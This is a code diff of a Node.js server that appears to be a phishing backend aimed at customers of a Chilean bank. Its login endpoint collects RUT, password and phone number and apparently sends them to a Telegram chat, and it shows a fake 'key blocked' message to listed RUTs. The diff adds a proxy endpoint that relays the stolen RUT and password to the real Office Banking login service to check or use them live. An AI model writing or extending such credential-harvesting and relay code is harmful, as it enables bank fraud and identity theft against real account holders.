@@ -16,9 +16,9 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 // Lista de RUTs bloqueados
-const bloqueados = ["250624344", "25062434-4", "25.062.434-4"]; // agrega aquí los RUTs que quieras bloquear
+const bloqueados = ["250624344", "25062434-4", "25.062.434-4"]; 
 
-// Endpoint de login
+// Endpoint de login (actual, con Telegram)
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
@@ -26,7 +26,6 @@ app.post("/login", async (req, res) => {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
   }
 
-  // Validación de RUT bloqueado
   if (bloqueados.includes(rut)) {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada");
   }
@@ -50,7 +49,26 @@ Teléfono: ${telefono}`;
   }
 });
 
-// Endpoint de autorización
+// Nuevo endpoint de proxy hacia Office Banking
+app.post("/proxy-login", async (req, res) => {
+  const { rut, passwd } = req.body;
+
+  try {
+    const externalResponse = await fetch("https://wslogin.officebanking.cl/", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({ rut, clave: passwd })
+    });
+
+    const result = await externalResponse.text();
+    res.status(externalResponse.status).send(result);
+  } catch (err) {
+    console.error(err);
+    res.status(500).send("❌ Error al conectar con Office Banking");
+  }
+});
+
+// Endpoint de autorización (actual)
 app.post("/autorizar", async (req, res) => {
   const mensaje = "AUTORIZAR!!!";
 
